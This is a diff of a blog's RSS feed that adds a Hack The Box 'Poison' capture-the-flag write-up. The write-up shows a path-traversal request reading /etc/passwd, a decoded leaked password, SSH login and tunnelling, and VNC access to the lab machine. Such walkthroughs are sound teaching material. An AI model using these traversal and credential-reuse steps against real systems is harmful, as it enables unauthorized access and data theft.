@@ -7,6 +7,302 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Hackthebox - Poison</title>
+        <description>&lt;p&gt;A little bit late but here comes my write up to another box from Hackthebox called &lt;strong&gt;&lt;em&gt;Poison&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Let’s start the attack by scanning with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nmap -v -sS -A -T4 10.10.10.84
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 09:46 EDT
+NSE: Loaded 148 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 09:46
+Completed NSE at 09:46, 0.00s elapsed
+Initiating NSE at 09:46
+Completed NSE at 09:46, 0.00s elapsed
+Initiating Ping Scan at 09:46
+Scanning 10.10.10.84 [4 ports]
+Completed Ping Scan at 09:46, 0.08s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 09:46
+Completed Parallel DNS resolution of 1 host. at 09:46, 0.01s elapsed
+Initiating SYN Stealth Scan at 09:46
+Scanning 10.10.10.84 [1000 ports]
+Discovered open port 80/tcp on 10.10.10.84
+Discovered open port 22/tcp on 10.10.10.84
+Increasing send delay for 10.10.10.84 from 0 to 5 due to max_successful_tryno increase to 5
+Increasing send delay for 10.10.10.84 from 5 to 10 due to max_successful_tryno increase to 6
+Discovered open port 5911/tcp on 10.10.10.84
+Completed SYN Stealth Scan at 09:46, 20.35s elapsed (1000 total ports)
+Initiating Service scan at 09:46
+Scanning 3 services on 10.10.10.84
+Completed Service scan at 09:46, 6.12s elapsed (3 services on 1 host)
+Initiating OS detection (try #1) against 10.10.10.84
+Retrying OS detection (try #2) against 10.10.10.84
+Retrying OS detection (try #3) against 10.10.10.84
+Retrying OS detection (try #4) against 10.10.10.84
+Retrying OS detection (try #5) against 10.10.10.84
+Initiating Traceroute at 09:46
+Completed Traceroute at 09:46, 0.06s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 09:46
+Completed Parallel DNS resolution of 2 hosts. at 09:46, 0.01s elapsed
+NSE: Script scanning 10.10.10.84.
+Initiating NSE at 09:46
+Completed NSE at 09:46, 7.17s elapsed
+Initiating NSE at 09:46
+Completed NSE at 09:46, 1.26s elapsed
+Nmap scan report for 10.10.10.84
+Host is up (0.041s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
+|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
+|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
+80/tcp   open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+5911/tcp open  cpdlc?
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.70%E=4%D=7/8%OT=22%CT=1%CU=40695%PV=Y%DS=2%DC=T%G=Y%TM=5B4215CF
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=10D%TI=Z%CI=Z%II=RI%TS=22)SE
+OS:Q(TI=Z%CI=Z%II=RI%TS=21)SEQ(SP=FF%GCD=1%ISR=101%TI=Z%CI=Z%TS=20)SEQ(TI=Z
+OS:%CI=Z%TS=1F)OPS(O1=M54DNW6ST11%O2=M54DNW6ST11%O3=M280NW6NNT11%O4=M54DNW6
+OS:ST11%O5=M218NW6ST11%O6=M109ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=F
+OS:FFF%W6=FFFF)ECN(R=Y%DF=Y%T=40%W=FFFF%O=M54DNW6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=
+OS:40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=FFFF%S=O%A=S+%F=AS%O=
+OS:M109NW6ST11%RD=0%Q=)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD
+OS:=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0
+OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
+OS:(R=Y%DF=N%T=40%IPL=38%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
+OS:S%T=40%CD=S)
+
+Uptime guess: 0.000 days (since Sun Jul  8 09:46:43 2018)
+Network Distance: 2 hops
+IP ID Sequence Generation: All zeros
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+
+TRACEROUTE (using port 587/tcp)
+HOP RTT      ADDRESS
+1   50.58 ms 10.10.14.1
+2   42.90 ms 10.10.10.84
+
+NSE: Script Post-scanning.
+Initiating NSE at 09:46
+Completed NSE at 09:46, 0.00s elapsed
+Initiating NSE at 09:46
+Completed NSE at 09:46, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 48.73 seconds
+           Raw packets sent: 1504 (71.306KB) | Rcvd: 1088 (45.674KB)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From here we can see an open &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; ports. Let’s start by using &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; to get the content of the website.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl 10.10.10.84:80
+&amp;lt;html&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;Temporary website to test local .php scripts.&amp;lt;/h1&amp;gt;
+Sites to be tested: ini.php, info.php, listfiles.php, phpinfo.php
+
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+
+&amp;lt;form action=&quot;/browse.php&quot; method=&quot;GET&quot;&amp;gt;
+	Scriptname: &amp;lt;input type=&quot;text&quot; name=&quot;file&quot;&amp;gt;&amp;lt;br&amp;gt;
+	&amp;lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&amp;gt;
+&amp;lt;/form&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let’s check if this works by entering the file name &lt;code class=&quot;highlighter-rouge&quot;&gt;phpinfo.php&lt;/code&gt;, listed in the main page.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.10.10.84/browse.php?file=phpinfo.php
+
+Configuration File (php.ini) Path 	/usr/local/etc
+Loaded Configuration File 		/usr/local/etc/php.ini
+Scan this dir for additional .ini files /usr/local/etc/php&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;But can we get files other as those shown before? Let’s try that by entering the path to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.10.10.84/browse.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
+#
+root:*:0:0:Charlie &amp;amp;:/root:/bin/csh
+toor:*:0:0:Bourne-again Superuser:/root:
+daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
+operator:*:2:5:System &amp;amp;:/:/usr/sbin/nologin
+bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
+tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
+kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
+games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
+news:*:8:8:News Subsystem:/:/usr/sbin/nologin
+man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
+sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
+smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
+mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
+bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
+unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
+proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
+_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
+_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
+uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
+pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
+auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
+www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
+_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
+hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
+nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
+_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
+messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
+avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
+cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
+charix:*:1001:1001:charix:/home/charix:/bin/csh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Amazing, now we have a full list of users with potential target called &lt;code class=&quot;highlighter-rouge&quot;&gt;charix&lt;/code&gt; and possibility to view any file on the sytem. But before looking for misconfigurations, I’ve viewed other files from the main page and in the &lt;code class=&quot;highlighter-rouge&quot;&gt;listfiles.php&lt;/code&gt; there is an interesting find. File called &lt;code class=&quot;highlighter-rouge&quot;&gt;pwdbackup.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.10.10.84/browse.php?file=listfiles.php
+Array ( [0] =&amp;gt; . [1] =&amp;gt; .. [2] =&amp;gt; browse.php [3] =&amp;gt; index.php [4] =&amp;gt; info.php [5] =&amp;gt; ini.php [6] =&amp;gt; listfiles.php [7] =&amp;gt; phpinfo.php [8] =&amp;gt; pwdbackup.txt )&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let’s view it.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.10.10.84/browse.php?file=pwdbackup.txt
+This password is secure, it's encoded atleast 13 times.. what could go wrong really..
+
+Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
+bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
+bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
+M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
+WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
+eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
+WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
+MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
+T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
+WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
+WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
+NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
+Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
+WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
+VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
+Ukd4RVdub3dPVU5uUFQwSwo=&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can decode it, 13 times as specified in the file. We can use it by hand or write a script, doesn’t matter as the number of encode operations is small enough.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# echo &quot;Q2hhcml4ITIjNCU2JjgoMA==
+&amp;gt; &quot; | base64 -d
+Charix!2#4%6&amp;amp;8(0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;By the last time, we get, what looks like a password to the &lt;code class=&quot;highlighter-rouge&quot;&gt;charix&lt;/code&gt; account. Let’s try and &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; into the server with that credentials.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ssh charix@10.10.10.84
+Password for charix@Poison:
+Last login: Sun Jul  8 16:16:28 2018 from 10.10.14.246
+FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017
+
+Welcome to FreeBSD!
+
+Release Notes, Errata: https://www.FreeBSD.org/releases/
+Security Advisories:   https://www.FreeBSD.org/security/
+FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
+FreeBSD FAQ:           https://www.FreeBSD.org/faq/
+Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
+FreeBSD Forums:        https://forums.FreeBSD.org/
+
+Documents installed with the system are in the /usr/local/share/doc/freebsd/
+directory, or can be installed later with:  pkg install en-freebsd-doc
+For other languages, replace &quot;en&quot; with a language code like de or fr.
+
+Show the version of FreeBSD installed:  freebsd-version ; uname -a
+Please include that output and any error messages when posting questions.
+Introduction to manual pages:  man man
+FreeBSD directory layout:      man hier
+
+Edit /etc/motd to change this login announcement.
+When you've made modifications to a file in vi(1) and then find that
+you can't write it, type ``&amp;lt;ESC&amp;gt;!rm -f %'' then ``:w!'' to force the
+write
+
+This won't work if you don't have write permissions to the directory
+and probably won't be suitable if you're editing through a symbolic link.
+
+charix@Poison:~ % ls -la
+total 4728
+drwxr-x---  3 charix  charix      512 Jul  8 16:30 .
+drwxr-xr-x  3 root    wheel       512 Mar 19 16:08 ..
+-rw-r-----  1 charix  charix     1041 Mar 19 17:16 .cshrc
+-rw-rw----  1 charix  charix        0 Jul  8 16:30 .history
+-rw-r-----  1 charix  charix      254 Mar 19 16:08 .login
+-rw-r-----  1 charix  charix      163 Mar 19 16:08 .login_conf
+-rw-r-----  1 charix  charix      379 Mar 19 16:08 .mail_aliases
+-rw-r-----  1 charix  charix      336 Mar 19 16:08 .mailrc
+-rw-r-----  1 charix  charix      802 Mar 19 16:08 .profile
+-rw-r-----  1 charix  charix      281 Mar 19 16:08 .rhosts
+-rw-r-----  1 charix  charix      849 Mar 19 16:08 .shrc
+drwx------  2 charix  charix      512 Jul  8 16:29 .ssh
+-rwxr-xr-x  1 charix  charix     2211 Jul  8 16:29 kati
+-r--r--r--  1 charix  charix        0 Jul  8 16:29 secret
+-rw-r-----  1 root    charix      166 Mar 19 16:35 secret.zip
+-rw-r-----  1 root    charix       33 Mar 19 16:11 user.txt
+-rw-------  1 charix  charix  4734976 Jul  8 16:28 vi.core
+
+charix@Poison:~ % cat user.txt
+******************************&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And we have the first flag. In addition, there is a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;secret.zip&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;secret&lt;/code&gt;. I copied the file using &lt;code class=&quot;highlighter-rouge&quot;&gt;scp&lt;/code&gt;, but there was nothing apart from gibberish data. Unziped with passowrd of &lt;code class=&quot;highlighter-rouge&quot;&gt;charix&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# scp charix@10.10.10.84:~/secret.zip secret.zip
+Password for charix@Poison:
+secret.zip                                    100%  166     3.9KB/s   00:00    
+root@kali:~# file secret.zip 
+secret.zip: Zip archive data, at least v2.0 to extract
+root@kali:~# unzip secret.zip
+Archive:  secret.zip
+[secret.zip] secret password: 
+ extracting: secret                  
+root@kali:~# cat secret
+��[|Ֆz!root@kali:~# file secret
+secret: Non-ISO extended-ASCII text, with no line terminators&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;On further enumeration, I’ve noticed open connection on port &lt;code class=&quot;highlighter-rouge&quot;&gt;5901&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;charix@Poison:~ % netstat -l
+Active Internet connections
+Proto Recv-Q Send-Q Local Address                                 Foreign Address                               (state)
+tcp4       0     12 localhost.5901                                localhost.39582                               ESTABLISHED
+tcp4       0      0 localhost.39582                               localhost.5901                                ESTABLISHED&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can try to connect to it with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; in order to identify the service.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;charix@Poison:~ % nc 127.0.0.1 5901
+RFB 003.008&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Some protocol called &lt;code class=&quot;highlighter-rouge&quot;&gt;RFB&lt;/code&gt;? It’s simply &lt;a href=&quot;https://en.wikipedia.org/wiki/RFB_protocol&quot;&gt;VNC&lt;/a&gt;!&lt;/p&gt;
+
+&lt;p&gt;Firstly, let’s forward the connection, so that we can connect from or local machine.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ssh -L 5901:localhost:5901 -N -l charix 10.10.10.84
+Password for charix@Poison:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;One last step came with some struggle, as I could not find correct password for the &lt;code class=&quot;highlighter-rouge&quot;&gt;VNC&lt;/code&gt;. But remember the &lt;code class=&quot;highlighter-rouge&quot;&gt;secret&lt;/code&gt; file? It’s actually a password file, that we can use.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# vncviewer 127.0.0.1:5901 -p secret&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/poison/vnc.png&quot; alt=&quot;VNC Connected&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Altough I finished and rooted the box, I can fully recommend the video from &lt;a href=&quot;https://www.youtube.com/watch?v=rs4zEwONzzk&quot;&gt;Ippsec&lt;/a&gt;, 
+in which he showed amazing techniques used to attack the box. Go check it out!&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>
+        <pubDate>Thu, 13 Sep 2018 02:00:00 +0200</pubDate>
+        <link>http://localhost:4000/hackthebox-posion/</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox-posion/</guid>
+      </item>
+    
+      <item>
         <title>Vulnhub.com - Bulldog: 1</title>
         <description>&lt;p&gt;Welcome back to another challenge, which is &lt;strong&gt;Bulldog&lt;/strong&gt; machine from Vulnhub.&lt;/p&gt;
 
@@ -4100,230 +4396,6 @@ drwx------   2 root root  4096 Jun  7 22:33 .ssh
         <pubDate>Fri, 20 Jul 2018 02:00:00 +0200</pubDate>
         <link>http://localhost:4000/vulnhub-temple-of-doom/</link>
         <guid isPermaLink="true">http://localhost:4000/vulnhub-temple-of-doom/</guid>
-      </item>
-    
-      <item>
-        <title>Vulnhub.com - Toppo: 1</title>
-        <description>&lt;p&gt;Today we’re going to work through easy machine from Vulnhub called &lt;strong&gt;&lt;em&gt;Toppo&lt;/em&gt;&lt;/strong&gt;. If you don’t have time, but still want to get these shells, just try this machine.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;The Machine isn't hard to own and don't require advanced exploitation .
-
-Level : Beginner
-
-DHCP : activated
-
-Inside the zip you will find a vmdk file , and I think you will be able to use it with any usual virtualization software ( tested with Virtualbox) .
-
-If you have any question : my twitter is @h4d3sw0rm
-
-Happy Hacking !&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Author: &lt;a href=&quot;https://twitter.com/@h4d3sw0rm&quot;&gt;Hadi Mene&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/toppo_1,245/&quot;&gt;https://www.vulnhub.com/entry/toppo_1,245/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Big thanks to the author for creating this challenge and for Vulnhub for hosting and curating this great set of machines!&lt;/p&gt;
-
-&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
-
-&lt;p&gt;Firstly let’s start with our usual &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan in order to view the open ports on this machine.&lt;/p&gt;
-
-&lt;p&gt;What parameters I’m using?&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;em&gt;-v&lt;/em&gt; - verbose output&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;-sS&lt;/em&gt; - TCP-SYN scan&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;-A&lt;/em&gt; - OS detection, version detection and traceroute&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;-T4&lt;/em&gt; - aggresive scan&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;-p-&lt;/em&gt; - scan all 65535 ports&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 10.0.0.6
-Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-07-12 12:38 EDT
-NSE: Loaded 148 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
-NSE: Script Pre-scanning.
-Initiating NSE at 12:38
-Completed NSE at 12:38, 0.00s elapsed
-Initiating NSE at 12:38
-Completed NSE at 12:38, 0.00s elapsed
-Initiating ARP Ping Scan at 12:38
-Scanning 10.0.0.6 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
-Completed ARP Ping Scan at 12:38, 0.04s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating Parallel DNS resolution of 1 host. at 12:38
-Completed Parallel DNS resolution of 1 host. at 12:38, 0.00s elapsed
-Initiating SYN Stealth Scan at 12:38
-Scanning 10.0.0.6 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 80/tcp on 10.0.0.6
-Discovered open port 22/tcp on 10.0.0.6
-Discovered open port 111/tcp on 10.0.0.6
-Discovered open port 50394/tcp on 10.0.0.6
-Completed SYN Stealth Scan at 12:38, 4.12s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating Service scan at 12:38
-Scanning 4 services on 10.0.0.6
-Completed Service scan at 12:38, 11.02s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.0.6&lt;/span&gt;
-NSE: Script scanning 10.0.0.6.
-Initiating NSE at 12:38
-Completed NSE at 12:38, 0.38s elapsed
-Initiating NSE at 12:38
-Completed NSE at 12:38, 0.01s elapsed
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.6
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00046s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65531 closed ports
-PORT      STATE SERVICE VERSION
-22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp    open  http    Apache httpd 2.4.10 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-|_http-server-header: Apache/2.4.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Clean Blog - Start Bootstrap Theme
-111/tcp   open  rpcbind 2-4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100000)&lt;/span&gt;
-| rpcinfo: 
-|   program version   port/proto  service
-|   100000  2,3,4        111/tcp  rpcbind
-|   100000  2,3,4        111/udp  rpcbind
-|   100024  1          49973/udp  status
-|_  100024  1          50394/tcp  status
